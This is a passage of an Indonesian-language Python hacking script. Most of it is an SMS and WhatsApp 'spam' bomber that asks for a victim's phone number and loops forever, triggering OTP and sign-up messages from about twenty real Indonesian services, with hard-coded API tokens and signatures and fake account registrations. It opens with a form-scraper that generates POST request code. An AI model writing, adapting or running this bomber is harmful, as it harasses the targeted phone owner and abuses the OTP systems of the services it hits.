        for x in raq.find_all('form'):
            if self.tanya in ['1','01','a']: self.printing1(req,x)
            elif self.tanya in ['2','02','b']: self.printing2(req,x)
            elif self.tanya in ['3','03','c']: self.printing3(url,req,x)
            else: exit('\n [+] Isi Yang Benar Asu')

    def get_head1(self,req):
        data = {}
        head = req.headers
        usls = ['cookie','set-cookie','report-to','expires','x-fb-debug','date','last-modified','etag']
        for x,y in zip(head.keys(),head.values()):
            try:
                if x.lower() in usls: continue
                else: data.update({x:y})
            except Exception as e:continue
        return(data)

    def get_data1(self,form):
        data = {}
        for y in form.find_all('input'):
            try:data.update({y['name']:y['value']})
            except Exception as e:continue
        return(data)

    def get_data2(self,form):
        data = []
        for y in form.find_all('input'):
            try:data.append(y)
            except Exception as e:continue
        return(data)

    def get_post1(self,form):
        z = form['action']
        if 'https://'+self.domain in z: return(z)
        elif 'http://'+self.domain in z: return(z)
        else: return('https://%s%s'%(self.domain,z))

    def printing1(self,req,x):
        head = self.get_head1(req)
        data = self.get_data1(x)
        post = self.get_post1(x)
        coki = self.xyz.cookies.get_dict()
        print('\n\n[SOURCE PAYLOAD]\n')
        print('[Host] %s'%(self.domain))
        print('[Head] %s'%(head))
        print('[Data] %s'%(data))
        print('[Coki] %s'%(coki))
        print('[Post] %s'%(post))

    def printing2(self,req,x):
        head = self.get_head1(req)
        data = self.get_data2(x)
        post = self.get_post1(x)
        coki = self.xyz.cookies.get_dict()
        print('\n\n[PARSED PAYLOAD]\n')
        print('head = {')
        for x,y in zip(head.keys(),head.values()):
            print('    %s%s: %s'%(x,' '*(29-len(x)),y))
        print('    }')
        print('data = {')
        for x in data:
            try:
                if 'value' in str(x):
                    dp = 'name=' + re.search('name=(.*?)/>',str(x)).group(1)
                    fp = re.search('value="(.*?)"',str(dp)).group(1)
                    print("    %s%s: '%s',"%(x['name'],' '*(19-len(x['name'])),fp))
                elif 'name' in str(x):
                    print("    %s%s: '',"%(x['name'],' '*(19-len(x['name']))))
                else: continue
            except Exception as e: continue
        print('    }')
        print('cookie = {')
        for x,y in zip(coki.keys(),coki.values()):
            print('    %s%s: %s'%(x,' '*(5-len(x)),y))
        print('    }')
        print("next = '%s'"%(post))
        print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")
    def printing3(self,url,req,x):
        head = self.get_head1(req)
        data = self.get_data2(x)
        post = self.get_post1(x)
        print('\n\n[SOURCE CODE POST REQUESTS]\n')
        print("url  = '%s'"%(url))
        print("requ = bs(requests.Session().get(url).content,'html.parser')")
        print('head = {')
        for x,y in zip(head.keys(),head.values()):
            print('    %s%s: %s'%(x,' '*(29-len(x)),y))
        print('    }')
        print('data = {')
        for x in data:
            try:
                if 'value' in str(x):
                    dp = 'name=' + re.search('name=(.*?)/>',str(x)).group(1)
                    fp = re.search('value="(.*?)"',str(dp)).group(1)
                    gp = dp.replace(fp,'(.*?)')
                    rs = ("re.search('%s',str(requ)).group(1)"%(gp))
                    print('    %s%s: %s,'%(x['name'],' '*(19-len(x['name'])),rs))
                elif 'name' in str(x):
                    print("    %s%s: '',"%(x['name'],' '*(19-len(x['name']))))
                else: continue
            except Exception as e: continue
        print('    }')
        print("cookie = requests.Session().cookies.get_dict()")
        print("next = '%s'"%(post))
        print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")

#------------------[ DEFF SPAM SMS ]-------------------#

agent = random.choice(
		[
			"Mozilla/5.0 (Linux; Android 6.0.1; SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 5.0; SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36"
			"Mozilla/5.0 (Linux; Android 10; SM-A305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
	]
)

def process_data1():
	sleep(0.10)
	
def spam_sms():
	global nomor 
	cetak(panel(f'''   Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
	nomor = input(f" [+] Input No Hp : +62").replace("+62","")
	if nomor == "":
		pass
	else:
		while True:
			for _ in track(range(100), description=f' [+] Sedang Spam...'):process_data1()
			sxp_sms()

class sxp_sms:

	def __init__(self):
		self.req = requests.Session()
		self.main()

	def sms_otp_1(self, no):
		__req__ = self.req.post("https://service.mokapos.com/account/v1/verification/phone/send",
			headers = {
				  "accept": "application/json, text/plain, */*",
				  "authorization": "undefined",
				  "save-data": "on",
				  "user-agent": agent,
				  "content-type": "application/json;charset=UTF-8"
				},
			json = {
				 "phone_number": f"+62{no}"
			  }
		).text

	def sms_otp_2(self, no):
		data = json.dumps({
					"mobile": f"0{no}",
					"noise": "1583590641573155574",
					"request_time": "158359064157312",
					"access_token": "11111"
				   })
		__req__ = self.req.post("https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code",
			headers = {
				    "accept": "text/html, application/xhtml+xml, application/json, */*",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
				    "content-length": "166",
				    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
				    "origin": "https://h5.rupiahcepatweb.com",
				    "referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
				    "sec-fetch-dest": "empty",
				    "sec-fetch-mode": "cors",
				    "sec-fetch-site": "same-site",
				    "user-agent": agent
				  },
			data = {
				 "data": data
			   }
		).text

	def sms_otp_3(self, no):
		__req__ = self.req.post("https://www.olx.co.id/api/auth/authenticate",
			headers = {
				    "accept": "*/*",
				    "x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
				    "x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063",
				    "user-agent": agent,
				    "content-type": "application/json"
				  },
			json = {
				 "grantType": "retry",
				 "method": "sms",
				 "phone": no,
				 "language": "id"
				}
		).text

	def sms_otp_4(self, no):
		__req__ = self.req.post("https://www.alodokter.com/login-with-phone-number",
			headers = {
				    "user-agent": agent,
				    "content-type": "application/json",
				    "referer": "https://www.alodokter.com/login-alodokter",
				    "accept": "application/json",
				    "origin": "https://www.alodokter.com"
				  },
			json = {
				 "user":{
					  "phone": f"0{no}"
					}
				}
		).text

	def sms_otp_5(self, no):
		__req__ = self.req.post("https://www.kelaspintar.id/user/otpverification",
			headers = {
				    "x-requested-with": "XMLHttpRequest",
				    "user-agent": agent,
				    "Referer": "https://www.kelaspintar.id/"
				  },
			data = {
				 "user_mobile": no,
				 "otp_type": "send_otp_reg",
				 "mobile_code": "%2B62"
				}
		).text

	def sms_otp_6(self, no):
		aink_sanz = random.choice(
						[
							"Hallo Mantan",
							"Hallo Bangsad",
							"Hallo Sayang",
							"Hallo Ripper",
							"Hallo Ngab"
						]
					)
		email = random.choice(
					[
						"nsnsmsmksksmsm@gmail.com",
						"lavon.lockman@gmail.com",
						"duane_mclaughlin38@gmail.com",
						"alfreda.lindgren@gmail.com",
						"leonardo_kuhlman@gmail.com",
						"lyric51@gmail.com",
						"devonte_littel@gmail.com",
						"newell.kuhic@gmail.com"
					]
				)
		pw = random.choice(
					[
						"mamsmms123",
						"Wadepak1037",
						"waifugw1011"
					]
				)
		birth_date = random.choice(
						[
							"13/09/1999",
							"04/02/2022",
							"05/02/2022",
							"05/02/2022",
							"06/02/2022",
							"10/02/2022"
						]
	)
		__req__ = self.req.post("https://www.matahari.com/rest/V1/thorCustomers",
			json = {
				"thor_customer":{
						"name": aink_sanz,
						"card_number": None,
						"email_address": email,
						"mobile_country_code": "+62",
						"gender_id": "1",
						"mobile_number": f"0{no}",
						"mro": "",
						"password": pw,
						"birth_date": birth_date
						}
				},
			headers = {
					"Host": "www.matahari.com",
					"x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=",
					"origin": "https://www.matahari.com",
					"user-agent": agent,
					"content-type": "application/json",
					"accept": "*/*",
					"x-requested-with": "XMLHttpRequest",
					"referer": "https://www.matahari.com/customer/account/create/",
					"accept-encoding": "gzip, deflate, br",
					"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				}

		).text

	def sms_otp_7(self, no):
		__req__ = self.req.post("https://api.duniagames.co.id/api/user/api/v2/user/send-otp",
			headers = {
				    "Host": "api.duniagames.co.id",
				    "content-length": "32",
				    "accept": "application/json, text/plain, */*",
				    "x-device": "cc45ed83-73bd-4a98-83e3-874e8bc11a7f",
				    "accept-language": "id",
				    "user-agent": agent,
				    "ciam-type": "FR",
				    "content-type": "application/json",
				    "origin": "https://duniagames.co.id",
				    "sec-fetch-site": "same-site",
				    "sec-fetch-mode": "cors",
				    "sec-fetch-dest": "empty",
				    "referer": "https://duniagames.co.id/",
				    "accept-encoding": "gzip, deflate, br"
				  },
			json = {
				 "phoneNumber": f"+62{no}"
				}
		).text

	def sms_otp_8(self, no):
		__req__ = self.req.post("https://harvestcakes.com/register",
			headers = {
				    "user-agent": agent,
				    "Referer": "https://harvestcakes.com/register"
				  },
			data = {
				 "phone": f"0{no}",
				 "url": ""
				}
		).text

	def sms_otp_9(self, no):
		__req__ = self.req.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",
			headers = {
				    "Host": "identity-gateway.oyorooms.com",
				    "consumer_host": "https://www.oyorooms.com",
				    "accept-language": "id",
				    "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
				    "user-agent": agent,
				    "Content-Type": "application/json",
				    "accept": "*/*",
				    "origin": "https://www.oyorooms.com",
				    "referer": "https://www.oyorooms.com/login",
				    "Accept-Encoding": "gzip, deflate, br"
				  },
			json = {
				 "phone": f"0{no}",
				 "country_code": "+62",
				 "country_iso_code": "ID",
				 "nod": "4",
				 "send_otp": "true",
				 "devise_role": "Consumer_Guest"
				}
		).text

	def sms_otp_10(self, no):
		__req__ = self.req.post("https://crp-app.stamps.co.id/api/auth/validate-mobile-number",
			json = {
				"mobile_number": f"0{no}",
				"token": "sI01tF5bOSYHabS7HaXiB1k3j0JxFxbcQ79Rd1HFBjKEKJqYAwSNMScsx9AEZq3O"
				},
			headers = {
					"Host": "crp-app.stamps.co.id",
					"content-type": "application/json; charset=utf-8",
					"content-length": "106",
					"accept-encoding": "gzip",
					"User-Agent": agent
			}
		).text

	def sms_otp_11(self, no):
		__req__ = self.req.post("https://app-api.kredito.id/client/v1/common/verify-code/send",
			headers = {
				    "LPR-TIMESTAMP": "1603281035821",
				    "Accept-Language": "id-ID",
				    "LPR-BRAND": "Kredito",
				    "LPR-PLATFORM": "android",
				    "user-agent": agent,
				    "Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks",
				    "LPR-SIGNATURE": "e15dbea8602409df32a2ed5a123dc244",
				    "Content-Type": "application/json; charset=UTF-8",
				    "Content-Length": "79"
				   },
			data = '{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}' % no
		).text

	def sms_otp_12(self, no):
		__req__ = self.req.post("https://www.autofun.co.id:443/v2/captcha/sms",
			headers = {
					"Host": "www.autofun.co.id",
					"Connection": "keep-alive",
					"Content-length": "84",
					"accept": "*/*",
					"user-agent": agent,
					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
					"content-type": "application/json;charset=UTF-8",
					"Origin": "https://www.autofun.co.id",
					"X-Requested-With": "acr.browser.barebones",
					"Sec-Fetch-Site": "same-origin",
					"Sec-Fetch-Mode": "cors",
					"Sec-Fetch-Dest": "empty",
					"Referer": "https://www.autofun.co.id/mobil/datsun",
					"Accept-Encoding": "gzip, deflate"
				},
			json = {
					"phoneNum": f"62{no}",
					"languageCode": "id-id",
					"countryCode": "id",
					"platform": 2
			}
		).text

	def sms_otp_13(self, no):
		__req__ = self.req.post("https://api.myfave.com/api/fave/v3/auth",
			json = {
					"phone":"+62"+no
				},
			headers = {
					"Host": "api.myfave.com",
					"Connection": "keep-alive",
					"x-user-agent": "Fave-PWA/v1.0.0",
					"Origin": "https://m.myfave.com",
					"user-agent": agent,
					"content-type": "application/json",
					"Accept": "*/*",
					"Referer": "https://m.myfave.com/jakarta/auth",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
			}
		).text

	def sms_otp_14(self, no):
		nickname = random.choice(
					  [
					    "fahmi",
					    "xzc0der",
					    "bed3bah",
					    "xmanz"
					  ]
					)
		angka = random.randint(
					111,
					999
				      )
		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
			headers = {
				    "Host": "wong.kitabisa.com",
				    "x-ktbs-platform-name": "pwa",
				    "origin": "https://account.kitabisa.com",
				    "x-ktbs-time": "1611020248",
				    "user-agent": agent,
				    "x-ktbs-api-version": "1.0.0",
				    "accept": "application/json",
				    "x-ktbs-client-name": "kanvas",
				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
				    "x-ktbs-client-version": "1.0.0",
				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
				    "version": "3.4.0",
				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				  },
			json = {
				 "full_name": nickname+str(angka),
				 "username": f"62{no}",
				 "otp_type": "sms"
				}
		).text

	def main(self):
		self.sms_otp_1(nomor)
		self.sms_otp_2(nomor)
		self.sms_otp_3(nomor)
		self.sms_otp_4(nomor)
		self.sms_otp_5(nomor)
		self.sms_otp_6(nomor)
		self.sms_otp_7(nomor)
		self.sms_otp_8(nomor)
		self.sms_otp_9(nomor)
		self.sms_otp_10(nomor)
		self.sms_otp_11(nomor)
		self.sms_otp_12(nomor)
		self.sms_otp_13(nomor)
		self.sms_otp_14(nomor)
		cetak(panel(f"Sukses Spam SMS Ke No : +62{nomor}",width=90,padding=(0,2),style=f"bold white"))

#------------------[ DEFF SPAM WA ]-------------------# 
    
def spam_wa():
	global nomor
	cetak(panel(f'''   Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
	nomor = input(f" [+] Input No Hp : +62").replace("+62","")
	if nomor == "":
		pass
	else:
		while True:
			for _ in track(range(100), description=f' [+] Sedang Spam...'):process_data1()
			sxp_wa()
			
class sxp_wa:

	def __init__(self):
		self.req = requests.Session()
		self.main()

	def wa_otp_1(self, no):
		nickname = random.choice(
					  [
					    "fahmi",
					    "xzc0der",
					    "bed3bah",
					    "xmanz"
					  ]
					 )
		angka = random.randint(
					111,
					999
				       )
		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
			headers = {
				    "Host": "wong.kitabisa.com",
				    "x-ktbs-platform-name": "pwa",
				    "origin": "https://account.kitabisa.com",
				    "x-ktbs-time": "1611020248",
				    "user-agent": agent,
				    "x-ktbs-api-version": "1.0.0",
				    "accept": "application/json",
				    "x-ktbs-client-name": "kanvas",
				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
				    "x-ktbs-client-version": "1.0.0",
				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
				    "version": "3.4.0",
				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				   },
			json = {
				 "full_name": nickname+str(angka),
				 "username": f"0{no}",
				 "otp_type": "whatsapp"
				}
		).text

	def wa_otp_2(self, no):
		__req__ = self.req.get(
			f"https://m.redbus.id/api/getOtp?number={no}&cc=62&whatsAppOpted=true"
		).text

	def wa_otp_3(self, no):
		__req__ = self.req.post("https://api.bukuwarung.com/api/v1/auth/otp/send",
			headers = {
				    "Accept": "application/json",
				    "X-APP-VERSION-NAME": "3.4.0",
				    "X-APP-VERSION-CODE": "3399",
				    "Content-Type": "application/json; charset=UTF-8",
				    "Host": "api.bukuwarung.com",
				    "Connection": "Keep-Alive",
				    "Accept-Encoding": "gzip",
				    "User-Agent": agent
				   },
			json = {
				 "action": "LOGIN_OTP",
				 "countryCode": "62",
				 "deviceId": "00000177-142d-f1a2-bac4-57a9039fdc4d",
				 "method": "WA",
				 "phone": no
				}
		).text

	def wa_otp_4(self, no):
		__req__ = self.req.post("https://evermos.com/api/client/request-code",
			headers = {
				    "user-agent": agent
				  },
			data = {
				 "telephone": f"62{no}",
				 "type": 0
				}
		).text

	def wa_otp_5(self, no):
		__req__ = self.req.post("https://wapi.ruparupa.com/auth/generate-otp",
			headers = {
				    "Host": "wapi.ruparupa.com",
				    "Connection": "keep-alive",
				    "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E",
				    "Accept": "application/json",
				    "Content-Type": "application/json",
				    "X-Company-Name": "odi",
				    "user-agent": agent,
				    "user-platform": "mobile",
				    "X-Frontend-Type": "mobile",
				    "Origin": "https://m.ruparupa.com",
				    "Referer": "https://m.ruparupa.com/verification?page=otp-choices",
				    "Accept-Encoding": "gzip, deflate, br",
				    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				   },
			json = {
				 "phone": f"0{no}",
				 "action": "register",
				 "channel": "chat",
				 "email": "",
				 "customer_id": "0",
				 "is_resend": 0
				}
		).text

	def wa_otp_6(self, no):
		headers = {
			    "Connection": "keep-alive",
			    "Accept": "application/json, text/javascript, */*; q=0.01",
			    "Origin": "https://accounts.tokopedia.com",
			    "X-Requested-With": "XMLHttpRequest",
			    "user-agent": agent,
			    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
			    "Accept-Encoding": "gzip, deflate",
			   }
		site = self.req.get("https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn="+ no +"&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D", headers = headers).text
		search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
		data = {
			 "otp_type": "116",
			 "msisdn": no,
			 "tk": search,
			 "email": "",
			 "original_param": "",
			 "user_id": "",
			 "signature": "",
			 "number_otp_digit": "6",
			}
		__req__ = self.req.post(
				"https://accounts.tokopedia.com/otp/c/ajax/request-wa", headers = headers, data = data
	   ).text

	def main(self):
		self.wa_otp_1(nomor)
		self.wa_otp_2(nomor)
		self.wa_otp_3(nomor)
		self.wa_otp_4(nomor)
		self.wa_otp_5(nomor)
		self.wa_otp_6(nomor)
		cetak(panel(f" Sukses Spam WA Ke No : +62{nomor}",width=90,padding=(0,2),style=f"bold white"))

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/DUMP-FILE')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	login()
